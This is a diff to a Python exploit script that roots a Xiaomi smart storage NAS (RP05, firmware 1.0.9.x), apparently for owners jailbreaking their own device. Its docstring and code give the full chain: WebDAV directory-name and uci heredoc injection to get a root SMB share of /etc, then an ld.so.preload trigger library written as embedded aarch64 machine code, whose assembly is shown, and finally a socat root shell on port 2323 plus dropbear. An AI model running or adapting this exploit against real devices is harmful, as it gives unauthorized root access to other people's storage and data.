@@ -4,13 +4,14 @@ xiaomi-nas-root.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 ro
 参照 kid0114/xiaomi-nas-ssh-root-tool 的使用形态，攻击链为本仓库研究的新链路（uci heredoc 注入）。
 
 用法:
-    python xiaomi-nas-root.py <NAS_IP>
-    python xiaomi-nas-root.py <NAS_IP> --uid <米家数字UID>
-    python xiaomi-nas-root.py <NAS_IP> --cert-dir "C:\\Users\\you\\AppData\\Local\\minasCert"
+    python3 scripts/xiaomi-nas-root.py <NAS_IP>
+    python3 scripts/xiaomi-nas-root.py <NAS_IP> --uid <米家数字UID>
+    python3 scripts/xiaomi-nas-root.py --preflight
 
 前置条件:
     1. 本机已安装"小米智能存储"桌面端并登录过 NAS（证书目录默认自动查找）
-    2. 依赖: python3 (标准库), keystone-engine (pip install keystone-engine)
+    2. Python 3.9+（仅标准库，无 pip 包依赖；Conda/Homebrew 均非必需）
+    3. macOS 自带 ssh-keygen 与 /sbin/mount_smbfs
 
 敏感信息说明:
     - 证书目录默认搜索常见路径; 找不到时用 --cert-dir 指定
@@ -21,7 +22,7 @@ xiaomi-nas-root.py — 小米智能存储 (RP05, 固件 1.0.9.x) 一键获取 ro
     ① mTLS 证书 → get_pool_info 拿 WebDAV 凭据
     ② WebDAV MKCOL 换行目录名 + netshare/add_samba_account uci heredoc 注入
        → force user=root 的 SMB /etc 共享 (root 任意文件写)
-    ③ /etc/ld.so.preload + aarch64 触发 .so (keystone 现场汇编)
+    ③ /etc/ld.so.preload + aarch64 触发 .so (固定机器码, 无需现场汇编)
        → cron 每分钟 root 任务执行 → 装 socat root shell(2323) + dropbear(22)
 注: 本脚本不做持久化 (重启后 socat shell 与 dropbear 服务消失; SSH 公钥有意保留, 详见 USAGE.md)
 """
@@ -30,6 +31,7 @@ import base64
 import json
 import os
 import re
+import shutil
 import socket
 import ssl
 import subprocess
@@ -225,46 +227,32 @@ class Nas:
         s.close()
         return b"".join(chunks).decode("utf-8", "replace")
 
-
 def build_trigger_so(path_out):
-    """assemble minimal aarch64 ET_DYN .so whose DT_INIT forks /bin/sh /etc/.rootpwn.sh"""
-    try:
-        from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN
-    except ImportError:
-        die("keystone-engine missing: pip install keystone-engine")
+    """Write a minimal aarch64 ET_DYN .so whose DT_INIT forks /bin/sh /etc/.rootpwn.sh.
+
+    The machine code is embedded as fixed bytes: it has no variable inputs, so
+    the runner needs no assembler and no third-party Python packages. It was
+    assembled once with Keystone (KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN) from:
+
+        mov x0, #17; mov x1, xzr; mov x2, xzr; mov x3, xzr; mov x4, xzr
+        mov x8, #220; svc #0; cbnz x0, done
+        adr x0, str_sh; adr x5, str_script; stp x0, x5, [sp, #-32]!
+        str xzr, [sp, #16]; mov x1, sp; mov x2, xzr; mov x8, #221; svc #0
+        mov x8, #93; mov x0, #127; svc #0
+        done: ret
+        str_sh: .ascii "/bin/sh\\0"
+        str_script: .ascii "/etc/.rootpwn.sh\\0"
+
+    clone (220) -> child execve (221) /bin/sh /etc/.rootpwn.sh -> exit (93).
+    """
     import struct
 
-    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
-    asm = (
-        "init_fn:\n"
-        "    mov x0, #17\n"
-        "    mov x1, xzr\n"
-        "    mov x2, xzr\n"
-        "    mov x3, xzr\n"
-        "    mov x4, xzr\n"
-        "    mov x8, #220\n"
-        "    svc #0\n"
-        "    cbnz x0, done\n"
-        "    adr x0, str_sh\n"
-        "    adr x5, str_script\n"
-        "    stp x0, x5, [sp, #-32]!\n"
-        "    str xzr, [sp, #16]\n"
-        "    mov x1, sp\n"
-        "    mov x2, xzr\n"
-        "    mov x8, #221\n"
-        "    svc #0\n"
-        "    mov x8, #93\n"
-        "    mov x0, #127\n"
-        "    svc #0\n"
-        "done:\n"
-        "    ret\n"
-        "str_sh:\n"
-        '    .ascii "/bin/sh\\0"\n'
-        "str_script:\n"
-        '    .ascii "/etc/.rootpwn.sh\\0"\n'
+    code = bytes.fromhex(
+        "200280d2e1031faae2031faae3031faae4031faa881b80d2010000d4"
+        "800100b580010010a5010010e017bea9ff0b00f9e1030091e2031faa"
+        "a81b80d2010000d4a80b80d2e00f80d2010000d4c0035fd6"
+        "2f62696e2f7368002f6574632f2e726f6f7470776e2e736800"
     )
-    enc, cnt = ks.asm(asm)
-    code = bytes(enc)
 
     NUM_PH = 2
     code_va = 0x1000
@@ -468,19 +456,76 @@ def _dump_manual_cleanup(args, disarm):
     print("    " + disarm)
 
 
+def preflight(cert_dir_arg=None):
+    """Local-only checks. Runs before any NAS contact so a missing workstation
+    dependency fails fast instead of stranding an armed preload or share.
+    No third-party Python packages are required (standard library only)."""
+    problems = []
+    if sys.version_info < (3, 9):
+        problems.append("Python >= 3.9 required (found %s)" % sys.version.split()[0])
+    else:
+        log("ok", "python %s" % sys.version.split()[0])
+    if sys.platform == "darwin":
+        if not os.path.exists("/sbin/mount_smbfs"):
+            problems.append("/sbin/mount_smbfs missing (built into macOS; check system installation)")
+        if not shutil.which("ssh-keygen"):
+            problems.append("ssh-keygen not in PATH (install Xcode Command Line Tools: xcode-select --install)")
+        if not shutil.which("umount"):
+            problems.append("umount not in PATH")
+    elif os.name == "nt":
+        pass  # net use is a Windows system command
+    else:
+        if not shutil.which("mount"):
+            problems.append("mount not in PATH (Linux path also needs cifs-utils)")
+    try:
+        import tempfile
+        fd, tmp = tempfile.mkstemp(suffix=".so")
+        os.close(fd)
+        try:
+            build_trigger_so(tmp)
+            with open(tmp, "rb") as f:
+                magic = f.read(4)
+            if magic != b"\x7fELF" or os.path.getsize(tmp) < 0x1000:
+                problems.append("trigger .so self-test produced an invalid ELF")
+            else:
+                log("ok", "trigger .so self-test (%d bytes, embedded code)" % os.path.getsize(tmp))
+        finally:
+            os.unlink(tmp)
+    except Exception as exc:
+        problems.append("trigger .so self-test failed: %s" % exc)
+    cert_dir = find_cert_dir(cert_dir_arg)
+    if cert_dir:
+        log("ok", "cert dir %s" % cert_dir)
+    else:
+        problems.append("cert dir not found; install/log in to the desktop app or pass --cert-dir")
+    return problems
+
+
 def main():
     ap = argparse.ArgumentParser(description="Xiaomi NAS one-click root (RP05, fw 1.0.9.x)")
-    ap.add_argument("ip")
+    ap.add_argument("ip", nargs="?", default=None)
     ap.add_argument("--uid", default=None, help="mi UID digits (default: parsed from cert)")
     ap.add_argument("--cert-dir", default=None, help="client cert dir (auto-searched by default)")
     ap.add_argument("--shell-port", type=int, default=SHELL_PORT)
+    ap.add_argument("--preflight", action="store_true",
+                    help="check local prerequisites only; do not contact the NAS")
     args = ap.parse_args()
 
-    log("step", "定位客户端证书")
+    log("step", "本机前置检查 (preflight)")
+    problems = preflight(args.cert_dir)
+    if problems:
+        for p in problems:
+            log("fail", p)
+        die("preflight failed. Install Python 3.9+ from python.org, the Xcode "
+            "Command Line Tools, or any package manager; Conda and Homebrew are "
+            "optional, and no pip packages are required.")
+    if args.preflight:
+        log("ok", "preflight passed; NAS was not contacted")
+        return
+    if not args.ip:
+        ap.error("ip is required unless --preflight is used")
+
     cert_dir = find_cert_dir(args.cert_dir)
-    if not cert_dir:
-        die("cert dir not found; pass --cert-dir (App 安装目录下 minasCert)")
-    log("ok", cert_dir)
 
     nas = Nas(args.ip, cert_dir)
     if args.uid:
